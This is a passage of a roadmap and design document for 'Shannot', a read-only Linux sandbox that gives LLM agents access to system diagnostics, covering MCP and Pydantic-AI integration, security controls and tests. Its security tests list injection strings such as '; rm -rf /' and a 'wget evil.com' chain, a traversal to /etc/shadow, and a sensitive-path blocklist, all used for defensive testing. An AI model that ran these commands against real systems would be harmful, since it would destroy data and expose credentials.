- ✅ Claude Desktop shows Shannot tools
- ✅ Can run diagnostics via natural language
- ✅ Zero Python code required by end user

---

### 🚀 Phase 2: Enhanced MCP Features (Weeks 3-4)

**Goal**: Make MCP server production-ready

**Deliverables**:
1. **Per-command tools** (better UX)
   - Instead of: `sandbox_readonly({"command": ["ls", "/"]})`
   - Provide: `sandbox_readonly_ls({"path": "/", "long": true})`
   - Better schemas = better Claude suggestions

2. **MCP Resources**
   - `sandbox://profiles/diagnostics` → View profile config
   - `sandbox://system/disk` → Quick disk usage snapshot
   - `sandbox://system/memory` → Memory usage snapshot
   - Allows Claude to "check capabilities" before using tools

3. **Multi-profile management**
   ```bash
   shannot mcp add-profile custom.json
   shannot mcp list-profiles
   shannot mcp test  # Validate all profiles work
   ```

4. **Security enhancements**
   - Rate limiting (max 10 commands/minute per profile)
   - Audit logging to `~/.shannot/audit.log`
   - Input sanitization for path arguments

5. **Documentation**
   - Creating custom profiles guide
   - Security best practices
   - Team deployment (shared MCP server)

**Success Criteria**:
- ✅ 10+ specialized tools from 3 built-in profiles
- ✅ Resource browser shows available capabilities
- ✅ Audit log captures all executions
- ✅ Works for multi-user team deployment

---

### 📦 Phase 3: MCP Distribution (Week 5)

**Goal**: Make MCP server easy to find and install

**Deliverables**:
1. **PyPI package**: `shannot[mcp]`
   ```bash
   pip install shannot[mcp]
   # or
   pip install shannot-mcp  # Standalone package
   ```

2. **GitHub releases**
   - Binary releases for Linux (AppImage or static binary)
   - Pre-built Docker image
   - systemd service file for daemon mode

3. **Documentation hub**
   - Video tutorial (YouTube, 3 minutes)
   - Blog post with screenshots
   - Integration guide for different MCP clients

4. **Community**
   - Example profiles shared in `profiles/community/`
   - Template for contributing new profiles
   - Troubleshooting FAQ

**Success Criteria**:
- ✅ Listed on PyPI
- ✅ 100+ downloads in first week
- ✅ 3+ community-contributed profiles
- ✅ Positive user feedback

---

### 🔧 Phase 4: Pydantic-AI Agent API (Weeks 6-7)

**Goal**: Enable developers to build custom LLM apps with Shannot

**Note**: Tools already exist from Phase 1! Just need to expose as agent.

**Deliverables**:
1. **Pre-configured agent** (`shannot/agent.py`)
   - Uses existing tools from `shannot/tools.py` (already built in Phase 1)
   - SandboxDeps for dependency injection
   - Works with multiple LLM providers (OpenAI, Anthropic, Gemini)

2. **Example applications**
   - **FastAPI health endpoint**: `/health-report` returns LLM analysis
   - **CLI diagnostic tool**: Interactive Q&A about system
   - **Cron monitoring job**: Check health, alert on issues

3. **Documentation**
   - "Building Your First Agent" tutorial
   - FastAPI integration guide
   - Monitoring automation patterns

4. **PyPI package**: `shannot[pydantic-ai]`

**Success Criteria**:
- ✅ 3 working example apps
- ✅ Developer can build custom agent in <30 minutes
- ✅ Works with OpenAI, Anthropic, and Gemini models

---

### 🏭 Phase 5: Advanced Pydantic-AI (Weeks 8-10)

**Goal**: Support complex production use cases

**Deliverables**:
1. **Fleet management example**
   - Monitor multiple servers via SSH + sandbox
   - Aggregate health across fleet
   - Smart alerting with LLM triage

2. **Structured output models**
   - SystemHealth, DiskAnalysis, ProcessReport
   - Type-safe, validated responses
   - Easy to integrate with existing tools

3. **Human-in-the-loop patterns**
   - Approval required for sensitive commands
   - Interactive debugging workflows
   - Escalation to human operator

4. **Advanced features**
   - Streaming responses (real-time output)
   - Multi-step workflows (conditional logic)
   - Retry logic with exponential backoff

**Success Criteria**:
- ✅ Fleet monitoring example manages 10+ servers
- ✅ Structured output integrates with Grafana/Prometheus
- ✅ Human approval prevents unwanted operations

---

### 🌐 Phase 6: Ecosystem & Production (Weeks 11-12)

**Goal**: Make Shannot the standard for LLM + Linux diagnostics

**Deliverables**:
1. **Hybrid MCP + Pydantic-AI**
   - MCP server uses Pydantic-AI agents internally
   - Best of both: easy setup + smart reasoning

2. **Integration guides**
   - LangChain tool adapter
   - LlamaIndex integration
   - Haystack pipeline component

3. **Production deployment**
   - Kubernetes manifests
   - Docker Compose for multi-server setup
   - Ansible playbook for fleet deployment

4. **Observability**
   - Pydantic Logfire integration
   - Metrics endpoint (Prometheus format)
   - Distributed tracing

5. **Enterprise features**
   - RBAC for multi-tenant deployments
   - SSO integration
   - Compliance reporting (audit exports)

**Success Criteria**:
- ✅ 1000+ PyPI downloads
- ✅ 3+ integration examples with popular frameworks
- ✅ Production deployment guides for Kubernetes
- ✅ Enterprise-ready features documented

---

## Security Considerations

### Threat Model

**Assumed Threats**:
1. **Malicious LLM Output**: Agent tries to execute disallowed commands
2. **Prompt Injection**: User input tricks agent into revealing sensitive data
3. **Information Disclosure**: Agent reads files it shouldn't access
4. **Resource Exhaustion**: Agent spawns infinite processes or fills disk

### Security Controls

#### Existing (Shannot Core)
- ✅ Command allowlisting (glob patterns)
- ✅ Read-only filesystem mounts
- ✅ Network isolation
- ✅ Namespace isolation (PID, mount, IPC)
- ✅ Ephemeral tmpfs (no persistence)

#### Additional for LLM Integration

**1. Rate Limiting**

```python
# MCP Server
from functools import wraps
import time
from collections import defaultdict

class RateLimiter:
    def __init__(self, max_calls: int, window_seconds: int):
        self.max_calls = max_calls
        self.window = window_seconds
        self.calls = defaultdict(list)
    
    def check(self, key: str) -> bool:
        now = time.time()
        # Remove old calls
        self.calls[key] = [t for t in self.calls[key] if now - t < self.window]
        
        if len(self.calls[key]) >= self.max_calls:
            return False
        
        self.calls[key].append(now)
        return True

# Apply to MCP tools
limiter = RateLimiter(max_calls=10, window_seconds=60)

@server.call_tool()
async def call_tool(tool_name: str, arguments: dict):
    if not limiter.check(f"tool:{tool_name}"):
        raise Exception("Rate limit exceeded")
    # ... execute tool
```

**2. Audit Logging**

```python
# Pydantic-AI agent
import logging
from datetime import datetime

audit_logger = logging.getLogger("shannot.audit")

@sandbox_agent.tool
async def run_sandbox_command(
    ctx: RunContext[SandboxDeps],
    command_input: CommandInput
) -> CommandOutput:
    # Log all command executions
    audit_logger.info(
        "sandbox_command_execution",
        extra={
            "timestamp": datetime.utcnow().isoformat(),
            "profile": ctx.deps.profile.name,
            "command": command_input.command,
            "user": getattr(ctx, "user_id", "unknown"),
        }
    )
    
    result = ctx.deps.manager.run(command_input.command)
    
    audit_logger.info(
        "sandbox_command_result",
        extra={
            "returncode": result.returncode,
            "duration": result.duration,
            "succeeded": result.succeeded()
        }
    )
    
    return CommandOutput(...)
```

**3. Input Sanitization**

```python
from pathlib import Path

def sanitize_path(path: str) -> str:
    """Ensure path doesn't escape sandbox-visible areas."""
    # Resolve to absolute path
    p = Path(path).resolve()
    
    # Block sensitive paths even if read-only
    sensitive = [
        "/root",
        "/home",  # Except /home/sandbox
        "/etc/shadow",
        "/etc/sudoers",
    ]
    
    for blocked in sensitive:
        if str(p).startswith(blocked) and not str(p).startswith("/home/sandbox"):
            raise ValueError(f"Access to {path} is not allowed")
    
    return str(p)

@sandbox_agent.tool
async def read_file(ctx: RunContext[SandboxDeps], path: str) -> str:
    """Read file with path validation."""
    safe_path = sanitize_path(path)
    result = ctx.deps.manager.run(["cat", safe_path])
    return result.stdout if result.succeeded() else result.stderr
```

**4. Output Filtering**

```python
import re

def filter_sensitive_output(text: str) -> str:
    """Remove potential secrets from output."""
    patterns = [
        (r'password["\s:=]+\S+', 'password=***'),  # Passwords
        (r'token["\s:=]+\S+', 'token=***'),        # API tokens
        (r'sk-[a-zA-Z0-9]{20,}', 'sk-***'),        # API keys
        (r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b', '****-****-****-****'),  # Credit cards
    ]
    
    filtered = text
    for pattern, replacement in patterns:
        filtered = re.sub(pattern, replacement, filtered, flags=re.IGNORECASE)
    
    return filtered

@sandbox_agent.tool
async def run_sandbox_command(...) -> CommandOutput:
    result = ctx.deps.manager.run(command_input.command)
    
    return CommandOutput(
        stdout=filter_sensitive_output(result.stdout),
        stderr=filter_sensitive_output(result.stderr),
        ...
    )
```

**5. Resource Limits**

```python
# Add to SandboxProfile
@dataclass(frozen=True)
class SandboxProfile:
    # ... existing fields
    
    # New resource limits
    max_execution_time: int = 30  # seconds
    max_output_size: int = 1_000_000  # 1MB
    max_concurrent_commands: int = 3

# Enforce in SandboxManager
from threading import Semaphore

class SandboxManager:
    def __init__(self, profile, bwrap_path):
        self.profile = profile
        self.bwrap_path = bwrap_path
        self._semaphore = Semaphore(profile.max_concurrent_commands)
    
    def run(self, command):
        with self._semaphore:  # Limit concurrency
            result = run_process(
                self._build_command(command),
                timeout=self.profile.max_execution_time
            )
            
            # Truncate large outputs
            if len(result.stdout) > self.profile.max_output_size:
                result.stdout = result.stdout[:self.profile.max_output_size] + "\n[truncated]"
            
            return result
```

### Security Checklist

- [ ] Command allowlisting enforced for all executions
- [ ] Read-only mounts verified (no write-capable binds)
- [ ] Network isolation enabled (unless explicitly needed)
- [ ] Rate limiting implemented per profile/user
- [ ] Audit logging captures all commands + results
- [ ] Input validation on all path arguments
- [ ] Output filtering removes sensitive patterns
- [ ] Resource limits prevent DoS (time, memory, output size)
- [ ] User authentication if exposed as service
- [ ] TLS for remote access
- [ ] Regular security updates for bubblewrap

---

## Testing Strategy

### Unit Tests

**Target**: Individual components (tools, validation, formatting)

```python
# tests/test_mcp_tools.py
@pytest.mark.asyncio
async def test_mcp_tool_schema_generation():
    """Test MCP generates correct tool schemas."""
    server = ShannotMCPServer([Path("profiles/minimal.json")])
    tools = await server.server.list_tools()
    
    assert len(tools) > 0
    assert any("sandbox_minimal" in t.name for t in tools)

# tests/test_pydantic_tools.py
@pytest.mark.asyncio
async def test_pydantic_tool_input_validation():
    """Test Pydantic validates tool inputs."""
    with pytest.raises(ValidationError):
        CommandInput(command="not a list")  # Should be list[str]
```

### Integration Tests

**Target**: End-to-end tool execution via framework

```python
# tests/test_integration_mcp.py
@pytest.mark.integration
@pytest.mark.requires_bwrap
async def test_mcp_server_full_flow():
    """Test MCP server full request/response cycle."""
    server = ShannotMCPServer([Path("profiles/readonly.json")])
    
    # Simulate MCP client request
    result = await server._execute_sandbox(
        "readonly",
        {"command": ["cat", "/etc/os-release"]}
    )
    
    assert result[0].type == "text"
    assert "Exit code: 0" in result[0].text
    assert "NAME=" in result[0].text

# tests/test_integration_pydantic.py
@pytest.mark.integration
@pytest.mark.requires_bwrap
@pytest.mark.requires_api_key  # Needs real LLM
async def test_pydantic_agent_full_conversation():
    """Test Pydantic-AI agent full conversation."""
    deps = SandboxDeps(profile_name="diagnostics")
    
    result = await sandbox_agent.run(
        "Check disk usage and tell me if any filesystem is over 80% full",
        deps=deps
    )
    
    assert isinstance(result.data, str)
    assert len(result.data) > 0
    # Should mention specific filesystems
```

### Performance Tests

```python
# tests/test_performance.py
import time

@pytest.mark.performance
async def test_mcp_latency():
    """Measure MCP call overhead."""
    server = ShannotMCPServer([Path("profiles/minimal.json")])
    
    start = time.perf_counter()
    for _ in range(100):
        await server._execute_sandbox("minimal", {"command": ["ls", "/"]})
    duration = time.perf_counter() - start
    
    avg_latency = duration / 100
    assert avg_latency < 0.1  # <100ms average

@pytest.mark.performance
async def test_pydantic_latency():
    """Measure Pydantic-AI call overhead."""
    deps = SandboxDeps(profile_name="minimal")
    
    start = time.perf_counter()
    for _ in range(100):
        await list_directory(
            RunContext(deps=deps, ...),
            path="/"
        )
    duration = time.perf_counter() - start
    
    avg_latency = duration / 100
    assert avg_latency < 0.05  # <50ms average
```

### Security Tests

```python
# tests/test_security.py
@pytest.mark.security
async def test_command_injection_prevention():
    """Test sandbox prevents command injection."""
    deps = SandboxDeps(profile_name="minimal")
    
    # Try shell injection
    malicious_commands = [
        ["ls", "; rm -rf /"],
        ["cat", "/etc/passwd && wget evil.com"],
        ["ls", "$(whoami)"],
    ]
    
    for cmd in malicious_commands:
        result = ctx.deps.manager.run(cmd)
        # Should fail or execute safely (sandbox prevents damage)
        assert result.returncode != 0 or ";" not in result.stdout

@pytest.mark.security
async def test_path_traversal_prevention():
    """Test sandbox prevents path traversal."""
    deps = SandboxDeps(profile_name="minimal")
    
    # Even if read succeeds, sandbox limits what's visible
    result = ctx.deps.manager.run(["cat", "../../../../etc/shadow"])
    # Should fail (file not visible in sandbox or read fails)
    assert result.returncode != 0 or len(result.stdout) == 0
```

---

## Future Enhancements

### Short-Term (3-6 months)

1. **LangChain Integration**
   - Shannot tool wrapper for LangChain agents
   - Example: SQL query safety checker using sandbox

2. **Observability Dashboard**
   - Web UI showing agent command history
   - Real-time monitoring of sandbox usage
   - Powered by Pydantic Logfire

3. **Pre-built Agent Personas**
   - "SysAdmin Assistant" - diagnostics focused
   - "Log Analyzer" - grep/awk/sed focused
   - "Config Reviewer" - read-only config inspection

4. **Remote Sandbox Support**
   - Run sandbox on remote host via SSH
   - Multi-host monitoring from single agent

### Medium-Term (6-12 months)

1. **Graph-Based Workflows**
   - Pydantic-AI graph support
   - Multi-step diagnostic workflows
   - Example: "Check disk → If low, find large files → Suggest cleanup"

2. **Custom Profile Generator**
   - LLM-powered profile creation
   - "I need to monitor nginx" → generates profile with nginx-specific tools

3. **Federated Sandbox Network**
   - Multiple sandboxes across infrastructure
   - Single agent can query all systems
   - MCP resource aggregation

4. **Advanced Security**
   - Seccomp filter generation from profile
   - eBPF-based monitoring
   - Automatic secret detection/redaction

### Long-Term (12+ months)

1. **Knowledge Base Integration**
   - Agent learns from previous diagnostics
   - Pattern recognition for common issues
   - Auto-remediation suggestions

2. **Compliance Automation**
   - CIS benchmark checking via sandbox
   - Automated compliance reporting
   - Drift detection

3. **AI-Powered Root Cause Analysis**
   - Multi-system correlation
   - Anomaly detection
   - Predictive maintenance

---

## Conclusion

### Recommended Approach: **MCP-First, Then Pydantic-AI**

**Phase 1: Start with MCP Server** (Weeks 1-4) - **PRIORITY**
- **Easier for most users**: No code required, just config
- **Immediate value**: Works with Claude Desktop out-of-box
- **Broader audience**: DevOps, SREs, non-programmers
- **Lower barrier to entry**: Install + configure = done
- **Faster time-to-value**: Users can start diagnosing systems same day

**Phase 2: Add Pydantic-AI** (Weeks 5-8) - **Advanced Use Cases**
- **For developers**: Those building custom monitoring/automation
- **Fleet management**: Monitor hundreds of servers programmatically
- **Complex workflows**: Multi-step diagnostics with conditional logic
- **Integration**: Embed into existing Python apps (FastAPI, Django, etc.)
- **Advanced patterns**: Structured output, human-in-the-loop, streaming

**Why This Order**:
1. **Reach More Users Faster**: MCP serves the 80% use case (interactive diagnostics)
2. **Build Momentum**: Early adopters give feedback before advanced features
3. **Learn from Usage**: MCP usage patterns inform what Pydantic-AI tools to build
4. **Natural Progression**: Simple → Complex matches user journey
5. **Code Reuse**: MCP server can later use Pydantic-AI internally for smarter tool routing

### Success Metrics

**Technical**:
- [ ] <100ms tool call latency (p95)
- [ ] 100% command allowlist enforcement
- [ ] Zero sandbox escapes in security testing
- [ ] >90% test coverage

**User Experience**:
- [ ] <5 minute setup time for new users
- [ ] Works out-of-box with Claude Desktop (MCP)
- [ ] Works out-of-box with FastAPI app (Pydantic-AI)
- [ ] Clear error messages for invalid commands

**Ecosystem**:
- [ ] Published to PyPI (both packages)
- [ ] 10+ example applications
- [ ] Integration with 3+ LLM frameworks
- [ ] Active community (GitHub stars, issues, PRs)

### Next Steps

1. **Validate Assumptions** (This Week)
   - Set up test environment
   - Verify bubblewrap behavior matches expectations
   - Test basic MCP and Pydantic-AI prototypes

2. **Create MVP** (Next 2 Weeks)
   - Implement basic MCP server
   - Implement basic Pydantic-AI agent
   - Test with real LLMs (Claude, GPT-4)

3. **Gather Feedback** (Week 4)
   - Share prototypes with early users
   - Document pain points
   - Refine approach based on learnings

4. **Full Implementation** (Weeks 5-12)
   - Follow roadmap above
   - Iterate based on feedback
   - Build example applications

---

## Appendix: Quick Reference

### MCP Server Setup

```bash
# Install
pip install shannot[mcp]

# Configure Claude Desktop
cat >> ~/Library/Application\ Support/Claude/claude_desktop_config.json <<EOF
{
  "mcpServers": {
    "shannot": {
      "command": "shannot-mcp",
      "env": {"SANDBOX_PROFILE": "readonly"}
    }
  }
}
EOF

# Restart Claude Desktop
```

### Pydantic-AI Setup

```bash
# Install
pip install shannot[pydantic-ai]

# Run example
python examples/diagnostic_cli.py
```

### Common Commands

```bash
# Test MCP server
shannot mcp --test

# Test Pydantic-AI agent
shannot agent --profile diagnostics --prompt "Check disk usage"

# Validate security
shannot security-audit --profile readonly

# Generate profile for agent
shannot generate-profile --for "nginx monitoring"
```

---

**Document Version**: 1.0  
**Last Updated**: 2025-10-20  
**Authors**: Claude (Anthropic) + Human Collaborator
